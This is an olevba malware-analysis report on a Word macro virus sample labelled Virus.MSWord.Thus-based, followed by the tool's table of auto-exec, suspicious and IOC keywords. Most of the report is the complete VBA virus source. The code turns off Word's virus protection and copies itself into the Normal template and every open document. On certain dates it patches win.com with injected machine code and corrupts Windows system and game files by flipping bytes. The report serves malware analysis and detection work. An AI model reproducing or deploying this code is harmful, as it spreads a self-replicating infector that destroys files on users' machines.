olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-58945419443f42fcebd21a8dea907d4fd9ca29a7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-58945419443f42fcebd21a8dea907d4fd9ca29a7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'1234567_y2k7'
    Dim Chk0$, Chk1$
    Dim k As Single, aa$, f As Boolean, i As Long, s$, x$, y$, pp As Integer
    Application.Options.VirusProtection = False
    On Error Resume Next
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'1234567_y2k7'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'1234567_y2k7'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If Month(Now()) > 8 And Day(Now()) > 6 Then
    If (Day(Now()) Mod 2 = 0) Then
        Chk0$ = "1234567_y2k7"
        Chk1$ = "????????????"
        Open "c:\windows\win.com" For Binary As 1
        p = LOF(1) - 11
        Get #1, p, Chk1$
        Close 1
        If Not Chk1$ = Chk0$ Then
                Open "c:\windows\win.com" For Binary As 1
                c = LOF(1)
                ox% = 0: oy% = 0
                Get #1, 1, ox%
                Get #1, 3, oy%
                n = c + &H100
                n = n - &H103
                ix& = (n And &HFF) * 256 + &HE9
                iy% = &HE00 + n \ 256
                Put #1, 1, ix&
                Put #1, 3, iy%
                Seek #1, c + 1
                a% = &HFFB9: Put #1, , a%
                a% = &H5100: Put #1, , a%
                a% = &HC889: Put #1, , a%
                a% = &H70BA: Put #1, , a%
                a% = &HEF00: Put #1, , a%
                a% = &HC889: Put #1, , a%
                a% = &H71BA: Put #1, , a%
                a% = &HEF00: Put #1, , a%
                a% = &H9059: Put #1, , a%
                a% = &HEFE2: Put #1, , a%
                a% = &H9090: Put #1, , a%
                iy% = &HE990
                Put #1, , iy%
                Close 1
                Open "c:\windows\win.com" For Binary As 1
                c = LOF(1) + 1
                ix& = ((oy% And &HFF)) * 256 + (ox% \ 256)
                ix& = ix& + &H100 + 3
                ix& = (ix& - 3) - (c + &H100 - 2)
                ix& = ix& And &HFFFF
                Seek #1, c
                Put #1, , ix&
                Put #1, , Chk0$
                Close 1
        End If
        s$ = "C:\WINDOWS\SYSTEM\NETCPL.CPL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\INETCPL.CPL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\MODEM.CPL": GoSub Chronicle
        s$ = "C:\WINDOWS\SOL.EXE": GoSub Chronicle
        s$ = "C:\WINDOWS\MSHEARTS.EXE": GoSub Chronicle
        s$ = "C:\WINDOWS\FREECELL.EXE": GoSub Chronicle
        If (Day(Now()) Mod 4 = 0) Then
            s$ = "C:\WINDOWS\SYSTEM\MSPRINT.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\MSPRINT2.DLL": GoSub Chronicle
        End If
    End If
    End If
    Exit Sub
Chronicle:
Open s$ For Binary Shared As 1
i = LOF(1) - 11
aa$ = "????????????"
Get #1, i, aa$
Close 1
If Not aa$ = "1234567_y2k7" Then
        Open s$ For Binary Shared As 1
        For i = 4 To 1020
                pp = 0
                Get #1, i, pp
                pp = (pp And &HFF00) Or (255 - (pp And &HFF))
                Put #1, i, pp
        Next
        Close 1
        Open s$ For Binary Shared As 1
        i = LOF(1) + 1
        Seek #1, i
        aa$ = "1234567_y2k7"
        Put #1, i, aa$
        Close 1
End If
Return
End Sub
Private Sub Document_Close()
'1234567_y2k7'
Document_Open
End Sub
Private Sub Document_New()
'1234567_y2k7'
Document_Open
End Sub




















































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |NETCPL.CPL          |Executable file name                         |
|IOC       |INETCPL.CPL         |Executable file name                         |
|IOC       |MODEM.CPL           |Executable file name                         |
|IOC       |SOL.EXE             |Executable file name                         |
|IOC       |MSHEARTS.EXE        |Executable file name                         |
|IOC       |FREECELL.EXE        |Executable file name                         |
|IOC       |MSPRINT.DLL         |Executable file name                         |
|IOC       |MSPRINT2.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

